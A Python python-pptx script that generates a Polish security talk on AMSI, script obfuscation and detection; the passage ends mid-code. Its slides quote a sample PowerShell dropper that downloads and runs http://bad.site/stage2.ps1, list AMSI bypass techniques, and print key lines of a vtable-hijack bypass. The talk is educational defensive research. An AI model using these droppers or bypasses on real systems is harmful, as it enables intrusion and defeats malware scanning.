from pptx import Presentation
from pptx.util import Inches, Pt, Emu
from pptx.dml.color import RGBColor
from pptx.enum.text import PP_ALIGN
from pptx.util import Inches, Pt
import copy

# ── Color palette ────────────────────────────────────────────────────────────
BG_DARK    = RGBColor(0x0D, 0x1B, 0x2A)   # dark navy
BG_CARD    = RGBColor(0x16, 0x2A, 0x3E)   # slightly lighter navy
ACCENT_RED = RGBColor(0xE6, 0x3A, 0x2F)   # red
ACCENT_ORG = RGBColor(0xF5, 0x8C, 0x1A)   # orange
TEXT_WHITE = RGBColor(0xFF, 0xFF, 0xFF)
TEXT_GREY  = RGBColor(0xAA, 0xBB, 0xCC)
BULLET_CLR = RGBColor(0xF5, 0x8C, 0x1A)

prs = Presentation()
prs.slide_width  = Inches(13.33)
prs.slide_height = Inches(7.5)

BLANK_LAYOUT = prs.slide_layouts[6]   # completely blank


# ── Helpers ──────────────────────────────────────────────────────────────────

def add_bg(slide, color=BG_DARK):
    """Fill slide background with solid colour."""
    from pptx.oxml.ns import qn
    from lxml import etree
    bg = slide.background
    fill = bg.fill
    fill.solid()
    fill.fore_color.rgb = color


def txbox(slide, text, l, t, w, h,
          size=18, bold=False, color=TEXT_WHITE,
          align=PP_ALIGN.LEFT, wrap=True):
    """Add a simple text box."""
    tf = slide.shapes.add_textbox(Inches(l), Inches(t), Inches(w), Inches(h))
    tf.word_wrap = wrap
    p = tf.text_frame.paragraphs[0]
    p.alignment = align
    run = p.add_run()
    run.text = text
    run.font.size = Pt(size)
    run.font.bold = bold
    run.font.color.rgb = color
    return tf


def rect(slide, l, t, w, h, fill_color, line_color=None):
    """Add a filled rectangle."""
    from pptx.util import Pt as Ptx
    shape = slide.shapes.add_shape(
        1,  # MSO_SHAPE_TYPE.RECTANGLE
        Inches(l), Inches(t), Inches(w), Inches(h)
    )
    shape.fill.solid()
    shape.fill.fore_color.rgb = fill_color
    if line_color:
        shape.line.color.rgb = line_color
        shape.line.width = Pt(1)
    else:
        shape.line.fill.background()
    return shape


def section_header(slide, number, title, time_hint=""):
    """Top bar with section number and title."""
    rect(slide, 0, 0, 13.33, 1.2, ACCENT_RED)
    txbox(slide, f"  {number}", 0, 0, 1.5, 1.2, size=36, bold=True, color=TEXT_WHITE)
    txbox(slide, title, 1.4, 0.05, 9.5, 0.75, size=30, bold=True, color=TEXT_WHITE)
    if time_hint:
        txbox(slide, time_hint, 1.4, 0.75, 9, 0.4, size=14, color=RGBColor(0xFF,0xCC,0x99))


def bullet_block(slide, items, l, t, w, h, title=None, title_color=ACCENT_ORG):
    """Render a list of bullet strings inside an optional titled block."""
    if title:
        txbox(slide, title, l, t, w, 0.35, size=15, bold=True, color=title_color)
        t += 0.38
        h -= 0.38
    tf = slide.shapes.add_textbox(Inches(l), Inches(t), Inches(w), Inches(h))
    tf.word_wrap = True
    for i, item in enumerate(items):
        p = tf.text_frame.paragraphs[0] if i == 0 else tf.text_frame.add_paragraph()
        p.space_before = Pt(4)
        run = p.add_run()
        run.text = f"▸  {item}"
        run.font.size = Pt(15)
        run.font.color.rgb = TEXT_WHITE


def add_card(slide, l, t, w, h, title, items, title_color=ACCENT_ORG):
    rect(slide, l, t, w, h, BG_CARD)
    txbox(slide, title, l+0.1, t+0.05, w-0.2, 0.35, size=14, bold=True, color=title_color)
    tf = slide.shapes.add_textbox(
        Inches(l+0.1), Inches(t+0.42), Inches(w-0.2), Inches(h-0.5))
    tf.word_wrap = True
    for i, item in enumerate(items):
        p = tf.text_frame.paragraphs[0] if i == 0 else tf.text_frame.add_paragraph()
        p.space_before = Pt(3)
        run = p.add_run()
        run.text = f"▸  {item}"
        run.font.size = Pt(13)
        run.font.color.rgb = TEXT_WHITE


# ── Slide 1: Title ───────────────────────────────────────────────────────────
s = prs.slides.add_slide(BLANK_LAYOUT)
add_bg(s)

# big red stripe
rect(s, 0, 2.6, 13.33, 0.08, ACCENT_RED)

txbox(s, "AMSI vs. Obfuscation", 1, 1.2, 11, 1.4,
      size=52, bold=True, color=TEXT_WHITE, align=PP_ALIGN.CENTER)
txbox(s, "A Cat-and-Mouse Game", 1, 2.65, 11, 0.8,
      size=30, bold=False, color=ACCENT_ORG, align=PP_ALIGN.CENTER)
txbox(s, "Radosław Kumorek  ·  Security Research", 1, 3.55, 11, 0.5,
      size=18, color=TEXT_GREY, align=PP_ALIGN.CENTER)
txbox(s, "45 min  |  CORE edition", 1, 4.1, 11, 0.4,
      size=14, color=TEXT_GREY, align=PP_ALIGN.CENTER)

# bottom strip
rect(s, 0, 6.9, 13.33, 0.6, BG_CARD)
txbox(s, "github.com/radkum", 0.3, 6.92, 6, 0.4, size=12, color=TEXT_GREY)
txbox(s, "ramsi-rs  ·  ps-parser  ·  cs-parser  ·  AmsiProviderScanDisruption",
      5, 6.92, 8, 0.4, size=12, color=TEXT_GREY, align=PP_ALIGN.RIGHT)


# ── Slide 2: Agenda ──────────────────────────────────────────────────────────
s = prs.slides.add_slide(BLANK_LAYOUT)
add_bg(s)
rect(s, 0, 0, 13.33, 0.85, BG_CARD)
txbox(s, "  Agenda  –  45 minut", 0, 0, 13, 0.85, size=26, bold=True, color=TEXT_WHITE)

agenda = [
    ("I",   "Wprowadzenie",                            "2 min"),
    ("II",  "Zagrożenia w skryptach  (3 slajdy)",        "5 min"),
    ("III", "Anti-Malware Scan Interface (AMSI)",       "8 min"),
    ("IV",  "Techniki obfuscacji i AMSI bypass",        "12 min"),
    ("V",   "Wykrywanie i obrona wielowarstwowa",       "10 min"),
    ("VI",  "Live demo: Hybrid detection pipeline",     "5 min"),
    ("VII", "Podsumowanie & Q&A",                       "3 min"),
]

for i, (num, title, dur) in enumerate(agenda):
    y = 1.05 + i * 0.78
    rect(s, 0.4, y, 0.55, 0.6, ACCENT_RED)
    txbox(s, num, 0.4, y, 0.55, 0.6, size=13, bold=True,
          color=TEXT_WHITE, align=PP_ALIGN.CENTER)
    txbox(s, title, 1.1, y+0.05, 9.5, 0.5, size=17, color=TEXT_WHITE)
    txbox(s, dur, 11.0, y+0.05, 2, 0.5, size=15, color=ACCENT_ORG, align=PP_ALIGN.RIGHT)


# ── Slide 3: II – Zagrożenia w skryptach ────────────────────────────────────
s = prs.slides.add_slide(BLANK_LAYOUT)
add_bg(s)
section_header(s, "II", "Zagrożenia w skryptach", "5 minut")

add_card(s, 0.3, 1.4, 4.0, 2.4, "Dlaczego skrypty są niebezpieczne?", [
    "Bezpośrednia bliskość do OS (PS, WMI, VBS, JS)",
    "Nie wymagają kompilacji",
    "Living-off-the-land — trudne do detekcji",
])

add_card(s, 4.7, 1.4, 4.0, 2.4, "Popularne wektory ataku", [
    "Script-based malware: ransomware, stealery",
    "Post-exploitation: lateral movement, privesc",
    "Initial access: spear-phishing z .ps1/.vbs/.js",
])

add_card(s, 9.1, 1.4, 3.9, 2.4, "Przykłady z życia", [
    "PowerShell droppers",
    "WMI-based persistence",
    "Obfuscated scripts w phishingu",
])

# bottom quote
rect(s, 0.3, 4.1, 12.7, 1.0, BG_CARD)
txbox(s,
      "\"Skrypty to miecz obosieczny: produktywność dla deweloperów, ładunek dla atakujących.\"",
      0.5, 4.15, 12.3, 0.9, size=16, color=ACCENT_ORG, align=PP_ALIGN.CENTER)


# ── Slide II.2: Statystyki ───────────────────────────────────────────────────
s = prs.slides.add_slide(BLANK_LAYOUT)
add_bg(s)
section_header(s, "II", "Statystyki: skala zagrożenia", "")

# Big numbers row
stats = [
    ("85%",  "ataków wykorzystuje\nnarzędzia już obecne w OS\n(LotL)", "Verizon DBIR 2023"),
    ("40%+", "incydentów zawiera\nkomponent PowerShell\nlub skryptowy", "IBM X-Force 2023"),
    ("24 B", "zagrożeń zblokowanych\nprzez AMSI od momentu\nwprowadzenia", "Microsoft MSTIC"),
    ("+40%", "wzrost ataków\n\"fileless\" (skryptowych)\nrok do roku", "CrowdStrike 2023"),
]
for i, (num, desc, src) in enumerate(stats):
    x = 0.3 + i * 3.25
    rect(s, x, 1.3, 3.0, 3.2, BG_CARD)
    rect(s, x, 1.3, 3.0, 0.08, ACCENT_RED)
    txbox(s, num,  x, 1.45, 3.0, 1.0, size=36, bold=True,
          color=ACCENT_ORG, align=PP_ALIGN.CENTER)
    txbox(s, desc, x+0.1, 2.5, 2.8, 1.4, size=13,
          color=TEXT_WHITE, align=PP_ALIGN.CENTER)
    txbox(s, src,  x+0.1, 4.05, 2.8, 0.35, size=10,
          color=TEXT_GREY, align=PP_ALIGN.CENTER)

# Bottom note
rect(s, 0.3, 4.7, 12.7, 1.5, BG_CARD)
txbox(s, "Dlaczego skrypty?", 0.5, 4.78, 3.5, 0.38, size=14, bold=True, color=ACCENT_ORG)
txbox(s,
      "Skrypty są atrakcyjne dla atakujących, bo:\n"
      "▸  działają w kontekście zaufanego procesu (powershell.exe, wscript.exe)\n"
      "▸  często whitelistowane przez polityki AV\n"
      "▸  nie zostawiają pliku na dysku (fileless execution)",
      0.5, 5.18, 12.1, 0.95, size=13, color=TEXT_WHITE)


# ── Slide II.3: Techniki ataku ───────────────────────────────────────────────
s = prs.slides.add_slide(BLANK_LAYOUT)
add_bg(s)
section_header(s, "II", "Techniki ataku opartego na skryptach", "")

# 3-column technique cards
add_card(s, 0.3, 1.35, 4.0, 2.5, "Initial Access", [
    "Spear-phishing z załącznikiem .ps1 / .vbs / .js",
    "Makra Office uruchamiające PowerShell",
    "HTML smuggling → decoded payload",
    "ISO/LNK trick omijający Mark-of-the-Web",
])
add_card(s, 4.65, 1.35, 4.0, 2.5, "Execution & Persistence", [
    "Invoke-Expression / IEX z zakodowaną komendą",
    "WMI Event Subscriptions (trwałość bez pliku)",
    "Scheduled Tasks przez PowerShell",
    "Registry Run keys z obfuscowanym payload",
])
add_card(s, 9.0, 1.35, 4.0, 2.5, "Post-Exploitation", [
    "Mimikatz przez Invoke-Mimikatz (PS)",
    "Lateral movement: WMI / WinRM / PSRemoting",
    "Data exfiltration przez Invoke-WebRequest",
    "Credential harvesting: LSASS dump in-memory",
])

# Taxonomy bar
rect(s, 0.3, 4.1, 12.7, 0.38, ACCENT_RED)
txbox(s, "MITRE ATT&CK: T1059.001 (PS)  ·  T1059.005 (VBS)  ·  T1059.007 (JS)  ·  T1546.003 (WMI Event Sub)",
      0.3, 4.1, 12.7, 0.38, size=12, bold=True, color=TEXT_WHITE, align=PP_ALIGN.CENTER)

# Fileless attack chain
txbox(s, "Typowy łańcuch ataku fileless:", 0.4, 4.65, 5, 0.35, size=13, bold=True, color=ACCENT_ORG)
chain = ["Phishing\nemail", "Klik\nmakro/LNK", "PowerShell\nw pamięci", "C2\ndownload", "Payload\n(fileless)"]
c_clrs = [BG_CARD, BG_CARD, ACCENT_RED, BG_CARD, RGBColor(0x1A,0x7A,0x3C)]
for i, (label, clr) in enumerate(zip(chain, c_clrs)):
    x = 0.35 + i * 2.55
    rect(s, x, 5.1, 2.2, 0.85, clr)
    txbox(s, label, x, 5.1, 2.2, 0.85, size=12, bold=True,
          color=TEXT_WHITE, align=PP_ALIGN.CENTER)
    if i < 4:
        txbox(s, "→", x+2.2, 5.18, 0.35, 0.65, size=18, color=ACCENT_ORG, align=PP_ALIGN.CENTER)


# ── Slide II.4: Przykład – PowerShell dropper ────────────────────────────────
s = prs.slides.add_slide(BLANK_LAYOUT)
add_bg(s)
section_header(s, "II", "Przykład: PowerShell dropper w phishingu", "")

# Left: obfuscated code
rect(s, 0.3, 1.35, 6.0, 4.4, BG_CARD)
txbox(s, "Kod odebrany przez ofiarę (obfuscowany)", 0.4, 1.42, 5.8, 0.35,
      size=12, bold=True, color=ACCENT_RED)
code_obf = (
    "$a='SQBuAHYAbwBrAGUALQBXAGUAYgBS\n"
    "AGUACQB1AGUAcwB0ACAAaAB0AHQAcAA6\n"
    "Ly9iYWQuc2l0ZS9zdGFnZTIucHMx\n"
    "IC1PdXRGaWxlICRlbnY6VEVNUC91\n"
    "cGRhdGUuZXhl';\n\n"
    "$b=[System.Text.Encoding]::Unicode\n"
    "  .GetString(\n"
    "    [Convert]::FromBase64String($a)\n"
    "  );\n\n"
    "iEX $b"
)
txbox(s, code_obf, 0.4, 1.82, 5.8, 3.7, size=11,
      color=RGBColor(0x88, 0xFF, 0x88))

# Right: decoded / clean version
rect(s, 6.7, 1.35, 6.3, 4.4, BG_CARD)
txbox(s, "Po dekodowaniu (ps-parser)", 6.8, 1.42, 6.1, 0.35,
      size=12, bold=True, color=ACCENT_ORG)
code_clean = (
    "# Stage 1 – download\n"
    "Invoke-WebRequest `\n"
    "  http://bad.site/stage2.ps1 `\n"
    "  -OutFile $env:TEMP\\update.exe\n\n"
    "# Stage 2 – execute\n"
    "Start-Process $env:TEMP\\update.exe\n\n"
    "# Stage 2 payload:\n"
    "#  → Mimikatz in-memory\n"
    "#  → LSASS dump → C2 exfil"
)
txbox(s, code_clean, 6.8, 1.82, 6.1, 3.7, size=11,
      color=RGBColor(0xFF, 0xCC, 0x77))

# Arrow between them
txbox(s, "ps-parser\n→ decode", 5.75, 2.9, 1.0, 0.8, size=11, bold=True,
      color=ACCENT_ORG, align=PP_ALIGN.CENTER)

# Bottom bar: what AMSI sees
rect(s, 0.3, 5.95, 12.7, 1.3, BG_CARD)
rect(s, 0.3, 5.95, 0.08, 1.3, ACCENT_RED)
txbox(s, "Co widzi AMSI?", 0.55, 6.0, 4, 0.38, size=13, bold=True, color=ACCENT_ORG)
txbox(s,
      "▸  Wersja obfuscowana → string nierozpoznany → może przejść\n"
      "▸  Wykonanie IEX → AMSI skanuje zdekodowany string w runtime → szansa na detekcję\n"
      "▸  Jeśli AMSI bypassed wcześniej → stage2 ładuje się bez żadnej kontroli",
      0.55, 6.42, 12.3, 0.78, size=12, color=TEXT_WHITE)


# ── Slide III.1 – Co to jest AMSI? ───────────────────────────────────────────
s = prs.slides.add_slide(BLANK_LAYOUT)
add_bg(s)
section_header(s, "III", "Anti-Malware Scan Interface (AMSI)", "8 minut")

# Big definition box
rect(s, 0.3, 1.3, 12.7, 1.35, BG_CARD)
rect(s, 0.3, 1.3, 0.08, 1.35, ACCENT_ORG)
txbox(s,
      "AMSI to standardowy interfejs Windows API, który pozwala aplikacji "
      "przekazać dowolną treść (skrypt, komendę, bufor) do zarejestrowanego "
      "providera antymalware — zanim zostanie wykonana.",
      0.55, 1.36, 12.2, 1.2, size=17, color=TEXT_WHITE)

# 4 info cards in a row
info = [
    ("Od kiedy?",
     "Windows 10 / Server 2016\n(build 1507, 2015)\nRozszerzone w Win 11",
     ACCENT_RED),
    ("Po co?",
     "Ustandaryzowanie skanowania\nskryptów — AV nie musi\npatchować każdego hosta",
     ACCENT_ORG),
    ("Kiedy działa?",
     "Przed wykonaniem każdego\nbloku kodu — synchronicznie,\nw tym samym procesie",
     RGBColor(0x1A, 0x7A, 0xAA)),
    ("Kiedy NIE działa?",
     "Gdy nie ma zarejestrowanego\nprovidera lub AMSI\nzostał wyłączony/zbypasowany",
     RGBColor(0x99, 0x22, 0x22)),
]
for i, (title, body, clr) in enumerate(info):
    x = 0.3 + i * 3.25
    rect(s, x, 2.85, 3.0, 2.55, BG_CARD)
    rect(s, x, 2.85, 3.0, 0.08, clr)
    txbox(s, title, x+0.1, 2.97, 2.8, 0.38, size=14, bold=True, color=clr)
    txbox(s, body,  x+0.1, 3.4,  2.8, 1.85, size=13, color=TEXT_WHITE)

# Bottom: where AMSI is integrated
rect(s, 0.3, 5.6, 12.7, 1.65, BG_CARD)
txbox(s, "Gdzie AMSI jest zintegrowane (built-in)?",
      0.5, 5.67, 12, 0.38, size=14, bold=True, color=ACCENT_ORG)
integrations = [
    ("PowerShell 5+",   "każdy blok skryptu\ni dynamiczny string"),
    ("Windows Script\nHost",    "VBScript, JScript"),
    ("Office 365",      "makra VBA od\nOffice 2016"),
    ("WMI",             "obiekty COM\nprzekazane do WMI"),
    (".NET / CLR",      "Assembly.Load()\nz byte[]"),
    ("Exchange\nOnline","skrypty po stronie\nserwera"),
]
for i, (name, desc) in enumerate(integrations):
    x = 0.45 + i * 2.15
    rect(s, x, 6.1, 2.0, 1.0, BG_DARK)
    txbox(s, name, x+0.05, 6.12, 1.9, 0.42, size=11, bold=True, color=ACCENT_ORG)
    txbox(s, desc, x+0.05, 6.54, 1.9, 0.5,  size=10, color=TEXT_GREY)


# ── Slide III.2 – Flow & architektura ────────────────────────────────────────
s = prs.slides.add_slide(BLANK_LAYOUT)
add_bg(s)
section_header(s, "III", "AMSI — Flow & architektura", "")

# ── LEFT column: component description ───────────────────────────────────────
components = [
    ("AmsiOpenSession()",
     "Aplikacja (np. powershell.exe) otwiera\nsesję AMSI — raz na kontekst uruchomienia."),
    ("AmsiScanBuffer() / AmsiScanString()",
     "Każdy blok kodu przed wykonaniem\nprzekazywany do skanowania przez API."),
    ("AMSI Provider (DLL)",
     "Zarejestrowany w HKLM\\SOFTWARE\\Microsoft\\\nAMSI\\Providers — np. Windows Defender,\nSentinelOne, CrowdStrike."),
    ("AMSI_RESULT",
     "AMSI_RESULT_CLEAN (0) lub\nAMSI_RESULT_DETECTED (32768+)\n→ aplikacja blokuje lub kontynuuje."),
]
for i, (name, desc) in enumerate(components):
    y = 1.3 + i * 1.45
    rect(s, 0.3, y, 5.5, 1.32, BG_CARD)
    rect(s, 0.3, y, 0.07, 1.32, ACCENT_RED)
    txbox(s, name, 0.5, y+0.05, 5.2, 0.38, size=13, bold=True, color=ACCENT_ORG)
    txbox(s, desc, 0.5, y+0.46, 5.2, 0.78, size=12, color=TEXT_WHITE)

# ── RIGHT column: flow diagram (vertical) ────────────────────────────────────
flow_steps = [
    (BG_CARD,                    "① Host application\n(powershell.exe)",
     "Uruchamia skrypt / dynamiczny blok"),
    (ACCENT_RED,                 "② amsi.dll\nAmsiScanBuffer()",
     "Przekazuje surowy bufor kodu"),
    (RGBColor(0x1A,0x50,0x8A),   "③ AMSI Provider\n(np. MpOav.dll)",
     "Windows Defender / 3rd-party AV"),
    (RGBColor(0x8A,0x1A,0x50),   "④ Verdict\nAMSI_RESULT",
     "CLEAN → execute   |   DETECTED → block"),
]
for i, (clr, title, sub) in enumerate(flow_steps):
    y = 1.3 + i * 1.45
    rect(s, 6.2, y, 6.8, 1.32, BG_CARD)
    rect(s, 6.2, y, 6.8, 0.08, clr)
    txbox(s, title, 6.35, y+0.1,  6.4, 0.52, size=14, bold=True, color=TEXT_WHITE)
    txbox(s, sub,   6.35, y+0.65, 6.4, 0.55, size=12, color=TEXT_GREY)
    if i < 3:
        txbox(s, "↓", 9.4, y+1.32, 0.5, 0.13, size=14, bold=True,
              color=ACCENT_ORG, align=PP_ALIGN.CENTER)

# Memory protection note at bottom
rect(s, 0.3, 7.1, 12.7, 0.28, ACCENT_RED)
txbox(s,
      "Memory protection: AmsiContext jest podpisany kryptograficznie — "
      "patchowanie go w pamięci jest wykrywane przez nowsze buildy Windows.",
      0.5, 7.1, 12.3, 0.28, size=11, bold=True, color=TEXT_WHITE, align=PP_ALIGN.CENTER)


# ── Slide IV.1 – AmsiProviderScanDisruption ──────────────────────────────────
s = prs.slides.add_slide(BLANK_LAYOUT)
add_bg(s)
section_header(s, "IV", "AmsiProviderScanDisruption — vtable hijack", "")

# Header bar with tagline
rect(s, 0.3, 1.3, 12.7, 0.55, BG_CARD)
rect(s, 0.3, 1.3, 0.07, 0.55, ACCENT_ORG)
txbox(s,
      "Technika: podmiana wskaźnika Scan() w vtable COM providera AMSI "
      "— całkowicie w user-mode, bez uprawnień admina.",
      0.5, 1.33, 12.3, 0.48, size=14, color=TEXT_WHITE)

# 5-phase flow (horizontal)
phases = [
    ("①\nImport",      "P/Invoke:\nkernel32.dll\n+ delegates"),
    ("②\nDiscovery",   "Registry:\nHKLM\\AMSI\\\nProviders"),
    ("③\nInstantiate", "DllGetClassObject\n→ IClassFactory\n→ CreateInstance"),
    ("④\nVTable\nhijack", "Kopiuj vtable\nScan → ptr do\nCloseSession"),
    ("⑤\nExecute",    "Iteracja po\nwszystkich\nproviderach"),
]
p_clrs = [BG_CARD, BG_CARD, BG_CARD, ACCENT_RED, RGBColor(0x1A,0x7A,0x3C)]
for i, ((title, body), clr) in enumerate(zip(phases, p_clrs)):
    x = 0.3 + i * 2.55
    rect(s, x, 2.05, 2.35, 2.2, clr)
    txbox(s, title, x, 2.05, 2.35, 0.75, size=13, bold=True,
          color=TEXT_WHITE, align=PP_ALIGN.CENTER)
    txbox(s, body,  x+0.08, 2.82, 2.2, 1.35, size=12,
          color=TEXT_WHITE, align=PP_ALIGN.CENTER)
    if i < 4:
        txbox(s, "→", x+2.35, 2.65, 0.2, 0.65, size=16, color=ACCENT_ORG,
              align=PP_ALIGN.CENTER)

# Core insight box
rect(s, 0.3, 4.45, 12.7, 1.35, BG_CARD)
rect(s, 0.3, 4.45, 0.07, 1.35, ACCENT_RED)
txbox(s, "Kluczowy mechanizm:", 0.5, 4.5, 4, 0.38, size=14, bold=True, color=ACCENT_RED)
txbox(s,
      "Każdy COM obiekt przechowuje wskaźnik na vtable (tablicę funkcji) jako pierwsze 8 bajtów.\n"
      "vtable[3] = Scan()   →   nadpisywane wskaźnikiem vtable[4] = CloseSession()\n"
      "Efekt: każde wywołanie Scan() natychmiast zwraca success bez żadnego skanowania.",
      0.5, 4.92, 12.3, 0.82, size=13, color=TEXT_WHITE)

# Code snippet
rect(s, 0.3, 6.0, 12.7, 1.3, BG_DARK)
txbox(s,
      "#  Scan → CloseSession  (kluczowa linia)\n"
      "[Marshal]::WriteIntPtr($new_vtable,  3 * [IntPtr]::Size,  $closeSessionPtr)\n"
      "[Marshal]::WriteIntPtr($pObj,  0,  $new_vtable)   # podmień vtable ptr obiektu",
      0.5, 6.05, 12.3, 1.15, size=12, color=RGBColor(0x88, 0xFF, 0x88))


# ── Slide IV.2 – Popularne techniki obfuscacji / bypass ──────────────────────
s = prs.slides.add_slide(BLANK_LAYOUT)
add_bg(s)
section_header(s, "IV", "Popularne techniki obfuscacji i AMSI bypass", "")

# 3-column grid: AMSI bypasses (left+middle) + obfuscation (right)
add_card(s, 0.3, 1.35, 4.0, 2.65, "AMSI Bypass — Reflection", [
    "AmsiUtils.amsiInitFailed = $true",
    "Patch via [Ref].Assembly.GetType(…)",
    "Dostęp przez .NET reflection do prywatnych pól",
    "Patched w PS 5.1+ — wymaga obejścia CLM",
    "Wariant: SetField() na amsiContext",
], title_color=ACCENT_RED)

add_card(s, 4.65, 1.35, 4.0, 2.65, "AMSI Bypass — Patching amsi.dll", [
    "VirtualProtect() → zmiana ochrony pamięci",
    "WriteProcessMemory() → NOP/xor rax,rax",
    "Cel: AmsiScanBuffer() lub AmsiOpenSession()",
    "Wymaga SeDebugPrivilege lub self-injection",
    "Wykrywane przez ETW + kernel callbacks",
], title_color=ACCENT_RED)

add_card(s, 9.0, 1.35, 4.0, 2.65, "Obfuscacja PowerShell", [
    "String splitting: 'AM'+'SI'",
    "Base64 + [Convert]::FromBase64String",
    "Backtick escaping: `I`E`X",
    "SecureString / char array concat",
    "Invoke-Obfuscation (PSv2 AST rewrite)",
], title_color=ACCENT_ORG)

# Second row
add_card(s, 0.3, 4.2, 4.0, 2.55, "AMSI Bypass — COM / Provider level", [
    "AmsiProviderScanDisruption ← ten talk",
    "Rejestracja własnego AMSI providera",
    "Unregister providera z HKLM",
    "Hooking NtProtectVirtualMemory",
], title_color=ACCENT_RED)

add_card(s, 4.65, 4.2, 4.0, 2.55, "Bypass — Środowisko / proces", [
    "PSv2 downgrade: powershell -version 2",
    "AMSI_DISABLE_PROVIDER env variable (legacy)",
    "CLM bypass przez custom runspace",
    "Alternate script hosts: cscript / mshta",
], title_color=RGBColor(0x1A,0x7A,0xAA))

add_card(s, 9.0, 4.2, 4.0, 2.55, "Obfuscacja C# / .NET", [
    "Reflection + DynamicMethod",
    "Assembly.Load() z byte[]",
    "Compile-time string encryption (ConfuserEx)",
    "IL mutation / control flow obfuscation",
    "Analiza: cs-parser",
], title_color=ACCENT_ORG)


# ── Slide 5: IV – Obfuscation techniques ─────────────────────────────────────
s = prs.slides.add_slide(BLANK_LAYOUT)
add_bg(s)
section_header(s, "IV", "Techniki obfuscacji  &  AMSI Bypass", "12 minut")

add_card(s, 0.3, 1.35, 4.1, 2.6, "Obfuscacja – podstawy (PS)", [
    "Base64 encoding zmiennych",
    "Łączenie stringów: 'AM'+'SI'",
    "Invoke-Expression + $ExecutionContext",
    "Aliasy i dodatkowe znaki (backtick, format)",
])

add_card(s, 4.7, 1.35, 4.0, 2.6, "AMSI Bypass – in-memory", [
    "Reflection: modyfikacja AmsiContext",
    "Hooking: przejęcie AMSI API calls",
    "Provider disabling",
    "AmsiProviderScanDisruption (PoC C#)",
])

add_card(s, 9.0, 1.35, 4.0, 2.6, "Obfuscacja C#", [
    "Dynamiczna kompilacja (Roslyn)",
    "Encoded assemblies",
    "Reflection + DynamicMethod",
    "Analiza: cs-parser",
])

# bottom bar – narzędzia
rect(s, 0.3, 4.2, 12.7, 2.05, BG_CARD)
txbox(s, "Narzędzia zaprezentowane w tej sekcji:", 0.5, 4.27, 12, 0.35,
      size=14, bold=True, color=ACCENT_ORG)

tools = [
    ("ps-parser", "Parser PowerShella w Rust\ncrates.io/crates/ps-parser"),
    ("AmsiProviderScanDisruption", "Autorski AMSI bypass (C#)\ngithub.com/radkum/..."),
    ("cs-parser", "Parser C# dla detekcji obfuscacji\ngithub.com/radkum/cs-parser"),
]
for i, (name, desc) in enumerate(tools):
    x = 0.5 + i * 4.2
    rect(s, x, 4.7, 3.9, 1.35, BG_DARK)
    txbox(s, name, x+0.1, 4.73, 3.7, 0.4, size=13, bold=True, color=ACCENT_ORG)
    txbox(s, desc, x+0.1, 5.15, 3.7, 0.8, size=12, color=TEXT_GREY)


# ── Slide V.1 – Dwie warstwy: overview ───────────────────────────────────────
s = prs.slides.add_slide(BLANK_LAYOUT)
add_bg(s)
section_header(s, "V", "Wykrywanie — dwie warstwy obrony", "10 minut")

# Layer 1 block
rect(s, 0.3, 1.3, 6.0, 5.5, BG_CARD)
rect(s, 0.3, 1.3, 6.0, 0.07, ACCENT_RED)
txbox(s, "Layer 1", 0.4, 1.35, 2.0, 0.5, size=22, bold=True, color=ACCENT_RED)
txbox(s, "AMSI / Static pipeline", 0.4, 1.82, 5.7, 0.42, size=16, bold=True, color=TEXT_WHITE)
l1_steps = [
    "① Raw script — wejście do pipeline'u",
    "② Detect obfuscation — jakie techniki użyto?",
    "③ Deobfuscate — ps-parser / cs-parser",
    "④ Deterministic rules — sygnatury, IoCs",
    "⑤ ML na deobfuscowanym — intencja kodu",
    "⑥ ML na oryginalnym — styl obfuscacji",
]
tf = s.shapes.add_textbox(Inches(0.45), Inches(2.35), Inches(5.65), Inches(4.2))
tf.word_wrap = True
for i, step in enumerate(l1_steps):
    p = tf.text_frame.paragraphs[0] if i == 0 else tf.text_frame.add_paragraph()
    p.space_before = Pt(6)
    run = p.add_run()
    run.text = step
    run.font.size = Pt(14)
    run.font.color.rgb = TEXT_WHITE

# Layer 2 block
rect(s, 7.0, 1.3, 6.0, 5.5, BG_CARD)
rect(s, 7.0, 1.3, 6.0, 0.07, RGBColor(0x1A,0x7A,0xAA))
txbox(s, "Layer 2", 7.1, 1.35, 2.0, 0.5, size=22, bold=True, color=RGBColor(0x1A,0x7A,0xAA))
txbox(s, "Behavioral / Telemetria", 7.1, 1.82, 5.7, 0.42, size=16, bold=True, color=TEXT_WHITE)
l2_steps = [
    "ETW / Sysmon — zdarzenia systemowe",
    "Odczyt HKLM\\AMSI\\Providers (bypass signal)",
    "PowerShell -version 2 (downgrade)",
    "Podejrzane process tree (Word → PS)",
    "Network connections ze script hostów",
    "LSASS access, credential patterns",
]
tf = s.shapes.add_textbox(Inches(7.1), Inches(2.35), Inches(5.65), Inches(4.2))
tf.word_wrap = True
for i, step in enumerate(l2_steps):
    p = tf.text_frame.paragraphs[0] if i == 0 else tf.text_frame.add_paragraph()
    p.space_before = Pt(6)
    run = p.add_run()
    run.text = f"▸  {step}"
    run.font.size = Pt(14)
    run.font.color.rgb = TEXT_WHITE

# vs separator
txbox(s, "vs", 6.35, 3.6, 0.6, 0.6, size=18, bold=True,
      color=TEXT_GREY, align=PP_ALIGN.CENTER)


# ── Slide V.2 – Layer 1: Static pipeline (szczegóły) ─────────────────────────
s = prs.slides.add_slide(BLANK_LAYOUT)
add_bg(s)
section_header(s, "V", "Layer 1 — Static pipeline (AMSI)", "")

# Pipeline flow — vertical steps with connectors
pipeline = [
    (ACCENT_RED,                  "① Raw script",
     "Obfuscowany kod — Base64, string split, backtick, encoding layers"),
    (RGBColor(0xC0,0x50,0x10),    "② Detect obfuscation",
     "ps-parser: jakie techniki użyto? Entropia, ratio Base64, AST complexity"),
    (RGBColor(0xA0,0x70,0x00),    "③ Deobfuscate",
     "ps-parser rozwija kolejne warstwy — wynik: czysty AST"),
    (RGBColor(0x1A,0x7A,0x3C),    "④ Deterministic rules",
     "Sygnatury IoC: Reflection.Assembly.Load, kernel32 imports, AMSI patterns"),
    (RGBColor(0x1A,0x5A,0xAA),    "⑤ ML — deobfuscowany",
     "Intencja kodu: dangerous API calls, C2 patterns, credential access"),
    (RGBColor(0x50,0x20,0x9A),    "⑥ ML — oryginalny",
     "Styl obfuscacji: entropia, fragmentacja, głębokość encodingu"),
]
for i, (clr, title, desc) in enumerate(pipeline):
    y = 1.3 + i * 1.02
    rect(s, 0.3, y, 2.5, 0.88, clr)
    txbox(s, title, 0.35, y+0.05, 2.4, 0.78, size=13, bold=True,
          color=TEXT_WHITE, align=PP_ALIGN.CENTER)
    rect(s, 3.0, y, 9.9, 0.88, BG_CARD)
    txbox(s, desc, 3.1, y+0.18, 9.7, 0.55, size=13, color=TEXT_WHITE)
    if i < 5:
